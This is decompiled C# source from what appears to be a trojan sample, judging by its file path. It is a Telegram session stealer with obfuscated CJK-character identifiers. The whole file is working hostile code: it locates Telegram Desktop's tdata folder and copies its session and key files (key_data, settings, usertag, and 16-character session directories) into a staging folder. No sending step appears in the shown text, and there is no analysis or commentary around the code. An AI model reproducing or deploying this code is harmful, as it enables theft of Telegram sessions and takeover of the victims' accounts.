// Decompiled with JetBrains decompiler
// Type: 至手丶戈髟瓦冖血匸牙毋斤攴糸耳.欠飛邑己鼓面臣尢羽自
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Diagnostics;
using System.IO;
using 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山;
using 火長宀舛火尸彐方自儿丿广;
using 見匚阜子攴方土石舛夂革心又;

namespace 至手丶戈髟瓦冖血匸牙毋斤攴糸耳
{
  internal sealed class 欠飛邑己鼓面臣尢羽自
  {
    private static string 彐丶石大爪几爻火曰缶髟()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
      Process[] processesByName = Process.GetProcessesByName("Telegram");
      return processesByName.Length == 0 ? str : Path.Combine(Path.GetDirectoryName(爪卩艸疋几宀氏小毋女父舌毛.工小牙干冫爻卩竹夂士(processesByName[0])), "tdata");
    }

    public static bool 走厶貝風彳革又行革立癶寸隹(string 襾寸赤月爻毛至革夂阜阜廾)
    {
      string path = 欠飛邑己鼓面臣尢羽自.彐丶石大爪几爻火曰缶髟();
      try
      {
        if (!Directory.Exists(path))
          return false;
        Directory.CreateDirectory(襾寸赤月爻毛至革夂阜阜廾);
        string[] directories = Directory.GetDirectories(path);
        string[] files = Directory.GetFiles(path);
        foreach (string str in directories)
        {
          string name = new DirectoryInfo(str).Name;
          if (name.Length == 16)
          {
            string 口幺父八立干弋田弋爿戈巛皿靑 = Path.Combine(襾寸赤月爻毛至革夂阜阜廾, name);
            風疋首弋高网瓜无力日山二儿.貝父山糸艸手水力犬网止大彐(str, 口幺父八立干弋田弋爿戈巛皿靑);
          }
        }
        foreach (string fileName in files)
        {
          FileInfo fileInfo = new FileInfo(fileName);
          string name = fileInfo.Name;
          string destFileName = Path.Combine(襾寸赤月爻毛至革夂阜阜廾, name);
          if (fileInfo.Length <= 5120L)
          {
            if (name.EndsWith("s") && name.Length == 17)
              fileInfo.CopyTo(destFileName);
            else if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
              fileInfo.CopyTo(destFileName);
          }
        }
        丿士止土巾幺山田巾弋宀小.尸八屮子阜尢辛風夕工言 = true;
        return true;
      }
      catch
      {
        return false;
      }
    }
  }
}
